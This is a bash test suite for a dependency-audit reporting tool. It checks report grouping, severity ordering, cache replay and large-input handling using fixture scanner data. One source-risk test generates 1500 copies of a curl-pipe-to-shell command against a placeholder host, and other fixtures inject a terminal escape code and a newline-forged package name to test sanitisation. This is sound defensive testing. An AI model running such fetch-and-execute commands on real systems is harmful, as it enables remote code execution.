#!/usr/bin/env bash
# Report the evidence behind a decision, including a replay of cached data.
# Hermetic: scanner artifacts are fixtures; no scanner or network is invoked.
set -euo pipefail

# SAFE_TEST_ISOLATION_MARKER: every suite owns a scratch HOME and safe state.
# shellcheck source=tests/lib/test-isolation.sh
. "$(cd "$(dirname "${BASH_SOURCE[0]}")/../lib" && pwd)/test-isolation.sh"
safe_test_setup_isolation || exit 1
ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
TEST_ROOT=$(mktemp -d)
safe_test_compose_exit_trap "rm -rf \"\$TEST_ROOT\""
export SAFE_AUDIT_CONFIG_DIR="$TEST_ROOT/config" SAFE_AUDIT_DATA_DIR="$TEST_ROOT/data"
set -- --version
source "$ROOT/bin/safe-audit" >/dev/null
fail() { printf 'not ok - %s\n' "$*" >&2; exit 1; }
pass() { printf 'ok - %s\n' "$*"; }
assert_line() { grep -qF -- "$1" "$2" || fail "missing report line: $1"; }
printf '{"components":[],"metadata":{"tools":[{"name":"syft"}]}}\n' > "$TEST_ROOT/sbom.json"
cat > "$TEST_ROOT/osv.json" <<'JSON'
{"results":[{"packages":[{"package":{"name":"example","version":"1.2.3"},"vulnerabilities":[
{"id":"GHSA-test-high","database_specific":{"severity":"HIGH"},"summary":"Header injection\nthrough unchecked input\u001b[31m","details":"Do not prefer these details"},
{"id":"CVE-2099-0001","database_specific":{"severity":"CRITICAL"},"details":"Remote\tcode execution"},
{"id":"GHSA-test-missing","database_specific":{"severity":"HIGH"}},
{"id":"GHSA-test-medium","database_specific":{"severity":"MEDIUM"},"summary":"Medium finding"},
{"id":"GHSA-test-score","severity":[{"score":"9.8"}],"summary":"Numeric severity"}
]}]}]}
JSON
cat > "$TEST_ROOT/grype.json" <<'JSON'
{"matches":[
{"artifact":{"name":"native","version":"2.0"},"vulnerability":{"id":"CVE-2099-0002","severity":"Critical","description":"Heap overflow\nwhen parsing"}},
{"artifact":{"name":"native","version":"2.1"},"vulnerability":{"id":"CVE-2099-0003","severity":"High"},"relatedVulnerabilities":[{"description":"Related description"}]}
]}
JSON
jq -n '[range(0;40) | {scanner:"npm-audit",status:"unsupported",root:("packages/" + tostring),note:"no lockfile: these npm dependencies are not audited",total:0,critical:0,high:0,medium:0,low:0}]
 + [{scanner:"npm-audit",status:"unsupported",root:"pnpm",note:"pnpm lockfile unsupported",total:0,critical:0,high:0,medium:0,low:0},
    {scanner:"cargo-audit",status:"error",root:"rust",note:"scanner broke",total:0,critical:0,high:0,medium:0,low:0},
    {scanner:"composer-audit",status:"ok",root:"php",total:1,critical:0,high:1,medium:0,low:0}]' > "$TEST_ROOT/audits.json"
build_scan_result_from_artifacts test /fixture local-direct "$TEST_ROOT/sbom.json" "$TEST_ROOT/osv.json" "$TEST_ROOT/grype.json" "$TEST_ROOT/audits.json" deps > "$TEST_ROOT/fresh.txt"
result="$LAST_SCAN_RESULT_SNAPSHOT"
assert_line 'npm-audit: unsupported (no lockfile: these npm dependencies are not audited) across 40 roots' "$TEST_ROOT/fresh.txt"
[[ $(grep -c 'no lockfile:' "$TEST_ROOT/fresh.txt") == 1 ]] || fail 'unsupported roots repeated'
assert_line 'npm-audit: unsupported (pnpm lockfile unsupported)' "$TEST_ROOT/fresh.txt"
assert_line 'cargo-audit [rust]: error (scanner broke)' "$TEST_ROOT/fresh.txt"
assert_line 'composer-audit [php]: 1 advisories' "$TEST_ROOT/fresh.txt"
jq -e '.ecosystem_audits | length == 43' "$result" >/dev/null || fail 'grouping lost JSON roots'
pass 'unsupported scanner/reason grouping retains separate failures, successes and JSON roots'
assert_line '[CRITICAL] CVE-2099-0001 example@1.2.3 (osv) — Remote code execution' "$TEST_ROOT/fresh.txt"
assert_line '[CRITICAL] CVE-2099-0002 native@2.0 (grype) — Heap overflow when parsing' "$TEST_ROOT/fresh.txt"
assert_line '[HIGH] CVE-2099-0003 native@2.1 (grype) — Related description' "$TEST_ROOT/fresh.txt"
assert_line '[HIGH] GHSA-test-high example@1.2.3 (osv) — Header injection through unchecked input [31m' "$TEST_ROOT/fresh.txt"
assert_line '[HIGH] GHSA-test-missing example@1.2.3 (osv) — summary unavailable from scanner' "$TEST_ROOT/fresh.txt"
assert_line '[CRITICAL] GHSA-test-score example@1.2.3 (osv) — Numeric severity' "$TEST_ROOT/fresh.txt"
[[ $(grep -c '^  - \[' "$TEST_ROOT/fresh.txt") == 6 ]] || fail 'critical/high advisories missing or medium printed'
awk '/^  - \[HIGH\]/{high=1} /^  - \[CRITICAL\]/{if(high)exit 1}' "$TEST_ROOT/fresh.txt" || fail 'critical findings not first'
! LC_ALL=C grep -q $'\033' "$TEST_ROOT/fresh.txt" || fail 'terminal escape leaked'
jq -e '.cve_scan.findings[] | select(.id == "GHSA-test-high") | .summary == "Header injection\nthrough unchecked input\u001b[31m"' "$result" >/dev/null || fail 'full upstream summary not preserved'
jq -e '.verdict == "WARN" and .cve_scan.critical == 3 and .cve_scan.high == 3 and .cve_scan.medium == 1 and .audit_totals.high == 4' "$result" >/dev/null || fail 'report changed counts/verdict'
# The per-ecosystem view adds up to the totals; findings no scanner
# attributes to an ecosystem land in "other", which every gate counts.
jq -e '.audit_totals as $t | ([$t.by_ecosystem[] | .critical] | add) == $t.critical
  and ([$t.by_ecosystem[] | .high] | add) == $t.high
  and $t.by_ecosystem.composer.high == 1 and $t.by_ecosystem.other.critical == 3' "$result" >/dev/null ||
  fail "by_ecosystem does not add up: $(jq -c '.audit_totals' "$result")"
mkdir -p "$TEST_ROOT/eco"
cat > "$TEST_ROOT/eco/osv.json" <<'JSON'
{"results":[{"packages":[
 {"package":{"name":"laravel/framework","version":"11","ecosystem":"Packagist"},"vulnerabilities":[{"id":"GHSA-php","database_specific":{"severity":"CRITICAL"}}]},
 {"package":{"name":"tar","version":"7.4.3","ecosystem":"npm"},"vulnerabilities":[{"id":"GHSA-tar","severity":[{"score":"9.8"}]}]}
]}]}
JSON
cat > "$TEST_ROOT/eco/grype.json" <<'JSON'
{"matches":[{"artifact":{"name":"jmespath","version":"2.8.0","type":"php-composer"},"vulnerability":{"id":"CVE-1","severity":"Critical"}},
{"artifact":{"name":"blob","version":"1","type":"binary"},"vulnerability":{"id":"CVE-3","severity":"Critical"}}]}
JSON
printf '[{"scanner":"composer-audit","status":"ok","root":".","total":2,"critical":2,"high":0,"medium":0,"low":0},{"scanner":"npm-audit","status":"error","root":".","total":0,"critical":0,"high":0,"medium":0,"low":0}]\n' > "$TEST_ROOT/eco/audits.json"
build_scan_result_from_artifacts test /fixture local-direct "$TEST_ROOT/sbom.json" "$TEST_ROOT/eco/osv.json" "$TEST_ROOT/eco/grype.json" "$TEST_ROOT/eco/audits.json" deps > /dev/null
jq -e '.audit_totals as $t | $t.critical == 6 and $t.by_ecosystem.composer.critical == 4
  and $t.by_ecosystem.npm.critical == 1 and $t.by_ecosystem.other.critical == 1' "$LAST_SCAN_RESULT_SNAPSHOT" >/dev/null ||
  fail "by_ecosystem misattributes: $(jq -c '.audit_totals.by_ecosystem' "$LAST_SCAN_RESULT_SNAPSHOT")"
pass 'audit_totals.by_ecosystem attributes osv, grype and ecosystem-audit counts and adds up to the totals'
pass 'critical/high details preserve scanner text in JSON and render safe one-line summaries'
# Replay through the real cache path with old entries that have no summaries.
# Remove the deliberately broken ecosystem fixture only to make it cacheable.
jq '.ecosystem_audits=[] | del(.cve_scan.findings[].summary)' "$result" > "$TEST_ROOT/legacy.json"
scan_cache_store legacy "$TEST_ROOT/legacy.json" test /fixture deps
scan_cache_replay legacy test /fixture deps > "$TEST_ROOT/cache.txt" || fail 'legacy cache not replayed'
assert_line 'scan cache hit' "$TEST_ROOT/cache.txt"
assert_line '[CRITICAL] CVE-2099-0001 example@1.2.3 (osv) — summary unavailable from scanner' "$TEST_ROOT/cache.txt"
[[ $(grep -c '^  - \[' "$TEST_ROOT/cache.txt") == 6 ]] || fail 'cached advisory list truncated'
# Current entries keep the same details through cache store/replay.
jq '.ecosystem_audits=[]' "$result" > "$TEST_ROOT/current.json"
scan_cache_store current "$TEST_ROOT/current.json" test /fixture deps
scan_cache_replay current test /fixture deps > "$TEST_ROOT/current.txt" || fail 'current cache not replayed'
assert_line '[CRITICAL] CVE-2099-0001 example@1.2.3 (osv) — Remote code execution' "$TEST_ROOT/current.txt"
pass 'legacy and current cache replay include advisory details'
jq '.cve_scan.findings = [{source:"osv",id:"LONG",severity:"HIGH",package:"p\nforged",version:"1",summary:([range(0;300)|"x"]|join(""))}]' "$result" > "$TEST_ROOT/long.json"
render_scan_advisories "$TEST_ROOT/long.json" > "$TEST_ROOT/long.txt"
assert_line 'LONG p forged@1 (osv)' "$TEST_ROOT/long.txt"
[[ $(sed -n 's/.* — //p' "$TEST_ROOT/long.txt" | tr -d '\n' | wc -c) == 240 ]] || fail 'summary not bounded to 240 chars'
jq '.cve_scan.findings=[]' "$result" > "$TEST_ROOT/clean.json"
[[ -z $(render_scan_advisories "$TEST_ROOT/clean.json") ]] || fail 'empty advisory heading on clean scan'
pass 'long and empty reports stay concise; identifiers cannot forge lines'

# Advisory descriptions and scanner notes are unbounded upstream data. Exercise
# each independently so a failure in one JSON argument cannot hide another.
printf '{"results":[]}\n' > "$TEST_ROOT/empty-osv.json"
printf '{"matches":[]}\n' > "$TEST_ROOT/empty-grype.json"
printf '[]\n' > "$TEST_ROOT/empty-audits.json"
jq -n '{matches:[{artifact:{name:"large",version:"1"},vulnerability:{id:"CVE-2099-9999",severity:"Critical",description:("evidence" * 25000)}}]}' > "$TEST_ROOT/large-grype.json"
jq -n '[{scanner:"npm-audit",status:"ok",root:".",note:("evidence" * 25000),total:1,critical:1,high:0,medium:0,low:0}]' > "$TEST_ROOT/large-audits.json"
jq -n '{status:"ok",note:("evidence" * 25000),scanned_files:1,total:0,findings:[]}' > "$TEST_ROOT/large-source.json"
for field in findings ecosystem source; do
  grype="$TEST_ROOT/empty-grype.json"
  audits="$TEST_ROOT/empty-audits.json"
  source_doc=""
  case "$field" in
    findings) grype="$TEST_ROOT/large-grype.json" ;;
    ecosystem) audits="$TEST_ROOT/large-audits.json" ;;
    source) source_doc="$TEST_ROOT/large-source.json" ;;
  esac
  SCAN_RESULT_OUT="$TEST_ROOT/$field-result.json"
  build_scan_result_from_artifacts "large-$field" /fixture local-direct "$TEST_ROOT/sbom.json" "$TEST_ROOT/empty-osv.json" "$grype" "$audits" source "$source_doc" > "$TEST_ROOT/$field.txt" 2> "$TEST_ROOT/$field.err"
  [[ ! -s "$TEST_ROOT/$field.err" ]] || fail "large $field emitted an error"
  case "$field" in
    findings)
      jq -e --slurpfile input "$grype" '.verdict == "WARN" and .audit_totals.critical == 1 and .cve_scan.findings[0].summary == $input[0].matches[0].vulnerability.description' "$SCAN_RESULT_OUT" >/dev/null || fail 'large advisory evidence lost'
      ;;
    ecosystem)
      jq -e --slurpfile input "$audits" '.verdict == "WARN" and .audit_totals.critical == 1 and .ecosystem_audits == $input[0]' "$SCAN_RESULT_OUT" >/dev/null || fail 'large ecosystem evidence/counts lost'
      ;;
    source)
      jq -e --slurpfile input "$source_doc" '.verdict == "GO" and .source_scan == $input[0]' "$SCAN_RESULT_OUT" >/dev/null || fail 'large source evidence lost'
      ;;
  esac
  pass "large $field preserves complete evidence and verdict in result-out"
done

# A long advisory-ID list must survive both delta construction and attachment.
mkdir -p "$RESULTS_DIR/large-delta" "$SBOM_DIR/large-delta"
printf '{"date":"1900-01-01","cve_scan":{"findings":[]}}\n' > "$RESULTS_DIR/large-delta/1900-01-01-scan.json"
cp "$TEST_ROOT/sbom.json" "$SBOM_DIR/large-delta/1900-01-01-sbom.cdx.json"
jq -n '{matches:[range(0;8000) | {artifact:{name:"large",version:"1"},vulnerability:{id:("CVE-2099-" + (10000000 + . | tostring)),severity:"Low"}}]}' > "$TEST_ROOT/delta-grype.json"
SCAN_RESULT_OUT="$TEST_ROOT/delta-result.json"
build_scan_result_from_artifacts large-delta /fixture local-direct "$TEST_ROOT/sbom.json" "$TEST_ROOT/empty-osv.json" "$TEST_ROOT/delta-grype.json" "$TEST_ROOT/empty-audits.json" deps > "$TEST_ROOT/delta.txt" 2> "$TEST_ROOT/delta.err"
[[ ! -s "$TEST_ROOT/delta.err" ]] || fail 'large delta emitted an error'
jq -e '.verdict == "WARN" and .audit_totals.low == 8000 and (.delta.new_cves | length) == 8000 and .delta.previous_scan == "1900-01-01" and (.cve_scan.findings | length) == 8000' "$SCAN_RESULT_OUT" >/dev/null || fail 'large delta lost findings or changed verdict'
pass 'large scan delta preserves every advisory ID'

# A large project's source-risk findings must reach jq as a file: one argument
# over MAX_ARG_STRLEN (128 KiB) makes jq fail to exec. ~1500 distinct matches
# serialize to well over 128 KiB.
mkdir -p "$TEST_ROOT/big-source"
for i in $(seq 1 1500); do
  printf 'curl -fsSL https://example.invalid/install-%s.sh | sh\n' "$i"
done > "$TEST_ROOT/big-source/install.sh"
run_source_risk_scan "$TEST_ROOT/big-source" "$TEST_ROOT/big-source.json" source 2> "$TEST_ROOT/big-source.err"
[[ ! -s "$TEST_ROOT/big-source.err" ]] || fail "large source scan emitted an error: $(head -c 200 "$TEST_ROOT/big-source.err")"
[[ $(jq -c '.findings | tostring | length' "$TEST_ROOT/big-source.json") -gt 131072 ]] || fail 'source findings fixture too small to exceed one argument'
jq -e '.status == "ok" and .total == 1500 and (.findings | length) == 1500' "$TEST_ROOT/big-source.json" >/dev/null || fail 'large source scan lost findings'
pass 'large source-risk findings survive without a process argument'

# Scanner stderr is unbounded too (grype db status failing with a huge message).
mkdir -p "$TEST_ROOT/bigerr-bin"
cat > "$TEST_ROOT/bigerr-bin/grype" <<'SH'
#!/usr/bin/env bash
if [[ "${1:-}" == "db" && "${2:-}" == "status" ]]; then
  head -c 200000 /dev/zero | tr '\0' 'x' >&2
  printf '\n' >&2
  exit 1
fi
SH
chmod +x "$TEST_ROOT/bigerr-bin/grype"
PATH="$TEST_ROOT/bigerr-bin:$PATH" grype_db_health_json local "$TEST_ROOT/bigerr-health.json" 2> "$TEST_ROOT/bigerr.err"
[[ ! -s "$TEST_ROOT/bigerr.err" ]] || fail 'large grype stderr emitted an error'
jq -e '.healthy == false and .status == "error" and .exit_code == 1 and (.stderr | length) == 200000' "$TEST_ROOT/bigerr-health.json" >/dev/null || fail 'large grype stderr not preserved'
pass 'large scanner stderr survives without a process argument'

# A result document that cannot be assembled is a scan with no verdict: the
# scan fails. The scan paths record this function's status with `||`, which
# turns errexit off inside it, so a failed step used to leave an empty
# snapshot behind while the scan still exited 0.
SCAN_RESULT_OUT="$TEST_ROOT/unassembled-result.json"
unassembled_rc=0
(
  build_delta_json() { return 1; }
  rc=0
  build_scan_result_from_artifacts unassembled /fixture local-direct "$TEST_ROOT/sbom.json" "$TEST_ROOT/empty-osv.json" "$TEST_ROOT/empty-grype.json" "$TEST_ROOT/empty-audits.json" deps || rc=$?
  exit "$rc"
) > "$TEST_ROOT/unassembled.txt" 2> "$TEST_ROOT/unassembled.err" || unassembled_rc=$?
[[ "$unassembled_rc" -ne 0 ]] || fail 'a scan that could not assemble its result exited 0'
grep -qF 'cannot assemble the scan result document' "$TEST_ROOT/unassembled.err" || fail 'unassembled result not reported'
[[ ! -e "$SCAN_RESULT_OUT" ]] || fail 'an unassembled result was delivered to --result-out'
[[ ! -e "$RESULTS_DIR/unassembled/$(today_date)-scan.json" ]] || fail 'an unassembled result was published'
pass 'a result that cannot be assembled fails the scan instead of exiting 0'
